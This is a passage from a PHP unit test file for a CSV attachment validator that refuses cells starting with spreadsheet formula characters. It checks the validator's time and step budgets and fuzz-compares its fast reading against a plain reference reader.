            PanelAttachments::validate([self::att('big.csv', 'text/csv', $bytes)], new PanelLimits());
        } catch (ApiError) {
            $threw = true;
        }
        $ms = (hrtime(true) - $t) / 1e6;
        $this->assertSame($refused, $threw);
        $this->assertLessThan(20000, $ms, 'took ' . round($ms) . ' ms for ' . strlen($bytes) . ' bytes');
    }

    /** The CSV step budget: cells that need PHP are counted across the readings; running out refuses the file (a small budget is injected to reach the branch). */
    public function testRunningOutOfTheCsvBudgetRefusesTheFile(): void
    {
        $reading = new \ReflectionMethod(PanelAttachments::class, 'csvReadingOk');
        $csv = str_repeat("\xC2\xA0a,", 10) . "\n";   // ten cells that the tokenizer leaves to PHP
        $budget = 100;
        $this->assertTrue($reading->invokeArgs(null, [$csv, ',', &$budget]), 'a budget that is enough');
        $this->assertSame(90, $budget, 'the ten cells were looked at in PHP (the empty cell after the final line break is the tokenizer\'s)');
        $budget = 5;
        $this->assertFalse($reading->invokeArgs(null, [$csv, ',', &$budget]), 'with a budget of five cells the reading gives up and refuses');
        $budget = 100;
        $this->assertTrue($reading->invokeArgs(null, [str_repeat('a,', 1000) . "\n", ',', &$budget]));
        $this->assertSame(100, $budget, 'cells the tokenizer consumes cost nothing');
        $budget = 100;
        $this->assertTrue($reading->invokeArgs(null, ['a,b', ',', &$budget]));
        $this->assertSame(99, $budget, 'a last cell with no line break after it is looked at in PHP');
    }

    /**
     * The fast reading (a regex tokenizer that consumes runs of plainly fine cells, PHP for the rest) must decide exactly as a plain reader that walks every byte and checks
     * every cell would. Random files over an alphabet of the characters that matter, and row-shaped files of mostly fine cells (so the batching and the quote-pair bound are
     * crossed), are compared with such a reader. Seeded, so a failure is reproducible.
     */
    public function testTheFastCsvReadingAgreesWithAPlainReader(): void
    {
        $csvOk = new \ReflectionMethod(PanelAttachments::class, 'csvOk');
        $inert = (string) (new \ReflectionClassConstant(PanelAttachments::class, 'CSV_INERT_CELL'))->getValue();
        $spaces = [' ', "\u{00A0}", "\u{1680}", "\u{180E}", "\u{202F}", "\u{205F}", "\u{2060}", "\u{3000}", "\u{FEFF}"];
        for ($cp = 0x2000; $cp <= 0x200D; ++$cp) {
            $spaces[] = mb_chr($cp, 'UTF-8');
        }
        $cellOk = static function (string $v) use ($inert, $spaces): bool {
            $p = 0;
            $skip = static function () use (&$p, $v, $spaces): void {
                do {
                    $moved = false;
                    foreach ($spaces as $sp) {
                        if (substr($v, $p, strlen($sp)) === $sp) {
                            $p += strlen($sp);
                            $moved = true;
                        }
                    }
                } while ($moved);
            };
            $skip();
            if (($v[$p] ?? '') === '"') {
                ++$p;
            }
            $skip();
            $c = $v[$p] ?? '';

            return $c === '' || !str_contains("=+-@\t\r\n", $c) || preg_match($inert, $v) === 1;
        };
        $readingOk = static function (string $b, string $separators) use ($cellOk): bool {
            $stop = $separators . "\r\n";
            $n = strlen($b);
            $i = 0;
            while (true) {
                $value = '';
                $j = $i;
                if ($i < $n && $b[$i] === '"') {
                    for ($j = $i + 1; true; ++$j) {
                        if ($j >= $n) {
                            return false;
                        }
                        if ($b[$j] === '"') {
                            if (($b[$j + 1] ?? '') !== '"') {
                                break;
                            }
                            ++$j;
                        }
                        $value .= $b[$j];
                    }
                    ++$j;
                }
                for (; $j < $n && !str_contains($stop, $b[$j]); ++$j) {
                    $value .= $b[$j];
                }
                if (!$cellOk($value)) {
                    return false;
                }
                if ($j >= $n) {
                    return true;
                }
                $i = $j + 1;
            }
        };
        $plain = static function (string $b) use ($readingOk): bool {
            $b = str_starts_with($b, "\xEF\xBB\xBF") ? substr($b, 3) : $b;
            $b = str_replace(["\u{0085}", "\u{2028}", "\u{2029}"], "\n", $b);
            $readings = [',', ';', "\t", ",;\t"];
            if (preg_match('/^"?sep=([^\r\n])/i', $b, $m) === 1) {
                if (!str_contains(",;\t!#$&()*/:<>?[\\]^_`{|}~", $m[1])) {
                    return false;
                }
                $readings[] = $m[1];
            }
            foreach ($readings as $separators) {
                if (!$readingOk($b, $separators)) {
                    return false;
                }
            }

            return true;
        };
        mt_srand(20261121);
        $alphabet = ['a', '1', '5', '.', ',', ',', ';', "\t", '"', '"', '""', ' ', '-', '+', '=', '@', "\r", "\n", "\r\n", 'e', '%', "'", "\u{00A0}", "\u{00E9}",
            "\u{201C}", "\u{2028}", "\u{0085}", '|', 'sep=', '-5', "\u{200B}", "\u{FEFF}"];
        $first = ['a', '"a"', '""', '"a,b"', '"a""b"', '""""', "\u{00E9}", "\"x\ny\"", '" a"', '"a""b""c""d""e""f""g""h""i""j"', "\u{5317}", 'x y'];
        $later = array_merge($first, ['-5', '+1.5', '"-1,234"', '-', '--', '+3', '1e5', '-5%', '', ' -2 ', '"+1,5"', 'a=1', 'b|c']);
        $cases = [];
        for ($k = 0; $k < 3000; ++$k) {
            $b = '';
            for ($t = mt_rand(1, 24); $t > 0; --$t) {
                $b .= $alphabet[mt_rand(0, count($alphabet) - 1)];
            }
            $cases[] = $b;
        }
        for ($k = 0; $k < 150; ++$k) {
            $b = '';
            for ($r = mt_rand(1, 12); $r > 0; --$r) {
                $cells = [$first[mt_rand(0, count($first) - 1)]];
                for ($c = mt_rand(0, 70); $c > 0; --$c) {
                    $cells[] = $later[mt_rand(0, count($later) - 1)];
                }
                $b .= implode(',', $cells) . (mt_rand(0, 1) === 1 ? "\n" : "\r\n");
            }
            if (mt_rand(0, 3) === 0) {
                $at = mt_rand(0, strlen($b));
                $b = substr($b, 0, $at) . ['=1', '-a', '"', "\t", '@x', ';-1+1', "\u{00A0}="][mt_rand(0, 6)] . substr($b, $at);
            }
            $cases[] = $b;
        }
        $accepted = 0;
        foreach ($cases as $b) {
            $fast = $csvOk->invoke(null, $b);
            $this->assertSame($plain($b), $fast, 'the fast and the plain reading disagree on ' . json_encode($b));
            $accepted += $fast ? 1 : 0;
        }
        // both verdicts occur often enough for the comparison to mean something
        $this->assertGreaterThan(300, $accepted);
        $this->assertGreaterThan(300, count($cases) - $accepted);
    }
}
